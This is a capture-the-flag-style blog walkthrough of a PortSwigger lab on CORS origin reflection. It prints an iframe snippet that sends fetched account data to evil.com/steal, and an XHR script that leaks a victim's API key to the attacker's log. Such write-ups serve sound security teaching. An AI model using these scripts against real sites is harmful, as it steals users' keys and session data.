---
title: " PortSwiggerlabs: CORS vulnerability with basic origin reflection"
date: 2026-08-18 00:00:00 +0000
categories: [PortSwiggerLabs , Cross-origin resource sharing ]
tags: [PortSwiggerLabs , Cross-origin resource sharing , Challenge , Web_Attacks ]
---


## Scenario : 

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter


## Solution : 

Before solving the lab, first let's quickly explain what CORS is and how it can be abused.

In a normal setup, a website can only read data from its own domain, makes sense. So if we login to bank.com, a random evil.com website can't just make a request to one of our website's endpoints (eg bank.com/api/balance/account/1), it should be blocked by the browser.

But sometimes, websites need to share data across domains, for example api.spotify.com will talk to open.spotify.com or something. These are actually different origins (different subdomains = different origins), so CORS is what lets them talk to each other. It's basically telling the server, "I trust requests coming from this origin" (eg open.spotify.com can access api.spotify.com/account/1).

The bug happens when the server doesn't care that much about who can make those requests. 2 classic screw-ups are:

- **Reflecting ANY Origin:**

Here the server just reflects any origin that asks, for example:

```bash
On the Request:   Origin: https://evilsite.com
On the Response:  Access-Control-Allow-Origin: https://evilsite.com
                  Access-Control-Allow-Credentials: true
```

If we find the Allow-Credentials: true, this is huge, since it tells the server to share cookies too.

- **Trusting NULL or sloppy wildcards:**

Some servers trust Origin: null (which attackers can forge via sandboxed iframes) or match subdomains badly (e.g. regex that accepts yourbank.com.evil.com).

So what does "forge via sandboxed iframes" actually mean? The browser doesn't always send a clean origin like https://evil.com. In certain cases it sends the literal string null instead, when the request comes from a context that has no real origin, like a page opened from a local file (file://), some redirects, and most importantly, a sandboxed iframe.

An iframe is just a webpage embedded inside another webpage, and you can add a sandbox attribute to lock it down. The catch: when you sandbox an iframe, the browser strips its origin and treats it as null. So if a server is dumb enough to trust Origin: null, an attacker can deliberately generate that null origin by running their malicious code inside a sandboxed iframe: 

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://yourbank.com/api/account', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(data => {
      fetch('https://evil.com/steal?d=' + btoa(data));
    });
  </script>
">
</iframe>
```
Developers sometimes whitelist null because it shows up during local testing and they think it's "safe/internal." But null is not safe, an attacker can produce it on demand. So trusting null is basically leaving a door open with a sign that says "only trusted ghosts allowed," and attackers can dress up as ghosts whenever they want.


Now back to the lab : 

<img width="1767" height="866" alt="image" src="https://github.com/user-attachments/assets/69afe08a-4385-48e4-a76f-d1244f18fd32" />

First let's login as the wiener user . 

<img width="1789" height="802" alt="image" src="https://github.com/user-attachments/assets/fb82e804-07f7-42bf-bd31-f9e6484790c9" />

Once we login, we get the API key of our user . 

Now back to Burp , let's check the History : 

<img width="1372" height="798" alt="image" src="https://github.com/user-attachments/assets/ae85fdb1-0d4c-4ad3-b5b7-ccacdb4d537e" />

We send it to Repeater , then we start our test , first we specify a different Origin and see if it gets reflected . 

<img width="1506" height="664" alt="image" src="https://github.com/user-attachments/assets/d3a0e1b4-6509-463b-bdf1-7f340c5483e9" />

Perfect, it gets reflected, and we also find Allow-Credentials: true which means it forwards cookies as well.

Now to abuse this, we first set up a malicious server. The idea is to simulate an attack as realistically as we can, by making sure our victim opens our malicious website while having an active session on the vulnerable one. Inside our malicious website, we'll have some JS that executes and sends the victim's API key back to our server.

First let's create our Malicious Website, i will use the Snippet provided to us by PortSwiggerLabs : 

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a3a00970337a698830ccd360016006f.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

I m not a developer , but by doing quick search, i was able to understand what this does : 

- **var req = new XMLHttpRequest();**
Creates a request object. Think of it as building an empty envelope that we're about to fill and send. (XMLHttpRequest, or "XHR", is the old-school way JavaScript makes HTTP requests, you could also do this with fetch.)

- **req.onload = reqListener;**
This says: "when the response comes back, run the function called reqListener." We're setting up what happens after we get the data. It's defined further down.

- **req.open('get', 'https://YOUR-LAB-ID.../accountDetails', true);**
We configure the envelope:

- **'get'** → the HTTP method (just fetching data).
- **the URL** → the vulnerable endpoint that leaks the API key.
- **true** → means the request is asynchronous (it doesn't freeze the page while waiting).
- **req.withCredentials = true;** this is the most important line
This tells the browser: "send the victim's cookies along with this request." Without it, the request would go out anonymous and useless. With it, the request rides on the victim's logged-in session, so the server thinks the victim is asking for their own details and happily returns the API key.

- **req.send();**
Fires the request. Envelope sent. 

Now for the Listener (what happens when the response arrives) : 

```js
function reqListener() {
    location='/log?key='+this.responseText;
};
```

- **this.responseText** → the full response we got back, which contains the victim's account details including the API key.
- **location = '/log?key=' + this.responseText** → this redirects the browser to a new URL, and jams the stolen data into the query string after ?key=.
So the browser ends up visiting something like:

```bash
/log?key={"username":"victim","apikey":"aBcD1234..."}
```

Because that request hits the attacker's own server, it gets recorded in the server's access log. The attacker just opens the log and reads the key straight out of the URL.

**The Entire Flow :**

Victim opens our page → script auto-runs → it requests /accountDetails with the victim's cookies → the bad CORS config lets us read the response → we stuff the API key into a URL that points back to us → we read it from our log.

Now we just go to our Exploit Server given to us by Portswiggerlabs :

And for the URL we want to visit on behalf of the user , it is this endpoint :

<img width="1465" height="629" alt="image" src="https://github.com/user-attachments/assets/ed707cff-6758-4666-a8a4-3f972325a02a" />

Since it holds the API Key . 

<img width="1748" height="926" alt="image" src="https://github.com/user-attachments/assets/f68d5d75-9eea-4def-ada8-0638218a04fe" />

Now we just Store it and Click Deliver Exploit to the Victim , what this will do is simulate the part where the victim visits our Malicious Website while having a session open on the other one . 

<img width="1836" height="758" alt="image" src="https://github.com/user-attachments/assets/52074a23-892f-44f9-9fb9-1cd076eb0bd1" />

Now if we check the Access Log , we will find the specific Request made with the Victim API Key . 

Now we just submit it and we should solve the lab . 

<img width="1503" height="675" alt="image" src="https://github.com/user-attachments/assets/7711aad9-fc7b-493a-83a1-3ff22fd77bb6" />

Since some parts are encoded , go to Cyberchef and paste the entire thing . 

<img width="1549" height="820" alt="image" src="https://github.com/user-attachments/assets/8a54d722-b5b2-4a5e-b437-79d2598fcdf6" />

Once Submitted , we see that the lab was solved : 

<img width="1599" height="797" alt="image" src="https://github.com/user-attachments/assets/bb92161d-9185-4f9c-bc20-9f3d3cf5bc35" />

That was all for this lab , see you in the next one :) 

